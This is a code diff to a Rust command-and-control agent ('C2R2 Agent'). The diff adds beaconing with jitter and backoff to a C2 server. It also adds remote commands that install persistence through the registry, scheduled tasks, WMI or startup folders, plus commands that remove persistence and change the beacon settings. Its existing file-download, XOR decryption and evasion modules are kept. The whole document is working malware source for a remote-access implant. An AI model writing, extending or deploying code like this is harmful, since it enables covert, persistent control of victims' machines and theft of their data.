@@ -3,6 +3,8 @@
 mod config;
 mod evasion;
 mod syscalls;
+mod persistence;
+mod beacon;
 
 #[cfg(target_os = "windows")]
 use std::ffi::CStr;
@@ -17,25 +19,35 @@ use std::path::Path;
 const DELIMITER: &str = "\n<<END>>\n";
 
 fn main() {
-    println!("DEBUG: C2R2 Agent v2.0 - Direct Connection");
+    println!("DEBUG: C2R2 Agent v2.0 - Beacon Mode");
     println!("DEBUG: Conectando a {}", config::C2_SERVER);
+    
+    // Configuración de beacon (60s con 30% jitter por defecto)
+    let beacon_config = beacon::BeaconConfig::default();
+    let mut retry_count = 0;
     
     loop {
         match TcpStream::connect(config::C2_SERVER) {
             Ok(stream) => {
                 println!("DEBUG: Conectado al servidor C2");
-                handle_connection(stream);
-                println!("DEBUG: Conexión cerrada, reintentando en 10s...");
+                retry_count = 0; // Reset retry counter on successful connection
+                handle_connection(stream, &beacon_config);
+                println!("DEBUG: Conexión cerrada");
             }
             Err(e) => {
-                println!("DEBUG: Error de conexión: {}, reintentando en 10s...", e);
+                println!("DEBUG: Error de conexión: {}", e);
             }
         }
-        thread::sleep(Duration::from_secs(10));
+        
+        // Calcular intervalo de retry con exponential backoff
+        let retry_interval = beacon::calculate_retry_interval(&beacon_config, retry_count);
+        println!("DEBUG: Reintentando en {} segundos...", retry_interval.as_secs());
+        beacon::beacon_sleep(retry_interval);
+        retry_count += 1;
     }
 }
 
-fn handle_connection(stream: TcpStream) {
+fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
     let mut reader = BufReader::new(stream.try_clone().unwrap());
     let mut writer = stream;
 
@@ -53,6 +65,28 @@ fn handle_connection(stream: TcpStream) {
                 if command == "ping" {
                     writer.write_all(b"pong\n").ok();
                     writer.flush().ok();
+                } else if command.starts_with("__PERSIST__:") {
+                    // Comando de persistencia: __PERSIST__:registry|task|wmi|startup
+                    let method = command.strip_prefix("__PERSIST__:").unwrap_or("");
+                    println!("DEBUG: Estableciendo persistencia: {}", method);
+                    let response = handle_persistence(method);
+                    writer.write_all(response.as_bytes()).ok();
+                    writer.flush().ok();
+                } else if command == "__PERSIST_REMOVE__" {
+                    // Comando para remover persistencia
+                    println!("DEBUG: Removiendo persistencia");
+                    let response = handle_persistence_remove();
+                    writer.write_all(response.as_bytes()).ok();
+                    writer.flush().ok();
+                } else if command.starts_with("__BEACON__:") {
+                    // Comando para cambiar configuración de beacon: __BEACON__:60:30
+                    let config_str = command.strip_prefix("__BEACON__:").unwrap_or("");
+                    println!("DEBUG: Cambiando configuración beacon: {}", config_str);
+                    let response = format!("__INFO__:Configuración de beacon recibida (se aplicará en próxima reconexión): {}{}", config_str, DELIMITER);
+                    writer.write_all(response.as_bytes()).ok();
+                    writer.flush().ok();
+                    // Nota: la configuración real se aplicaría guardándola en un archivo
+                    // pero para mantener simplicidad, solo informamos
                 } else if command.starts_with("__DOWNLOAD__:") {
                     // Formato: __DOWNLOAD__:ruta_del_archivo
                     let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
@@ -405,4 +439,42 @@ fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
         .enumerate()
         .map(|(i, &byte)| byte ^ key[i % key.len()])
         .collect()
+}
+
+/// Maneja el comando de persistencia
+fn handle_persistence(method_str: &str) -> String {
+    let method = match persistence::PersistenceMethod::from_str(method_str) {
+        Some(m) => m,
+        None => {
+            return format!(
+                "__ERROR__:Método de persistencia inválido. Usar: registry|task|wmi|startup{}",
+                DELIMITER
+            );
+        }
+    };
+    
+    match persistence::establish_persistence(method) {
+        Ok(msg) => {
+            println!("DEBUG: [PERSISTENCE] ✅ {}", msg);
+            format!("__SUCCESS__:{}{}", msg, DELIMITER)
+        }
+        Err(e) => {
+            println!("DEBUG: [PERSISTENCE] ❌ Error: {}", e);
+            format!("__ERROR__:Error estableciendo persistencia: {}{}", e, DELIMITER)
+        }
+    }
+}
+
+/// Maneja el comando de remoción de persistencia
+fn handle_persistence_remove() -> String {
+    match persistence::remove_persistence() {
+        Ok(msg) => {
+            println!("DEBUG: [PERSISTENCE] ✅ Limpieza: {}", msg);
+            format!("__SUCCESS__:Persistencia removida: {}{}", msg, DELIMITER)
+        }
+        Err(e) => {
+            println!("DEBUG: [PERSISTENCE] ❌ Error limpieza: {}", e);
+            format!("__ERROR__:Error removiendo persistencia: {}{}", e, DELIMITER)
+        }
+    }
 }
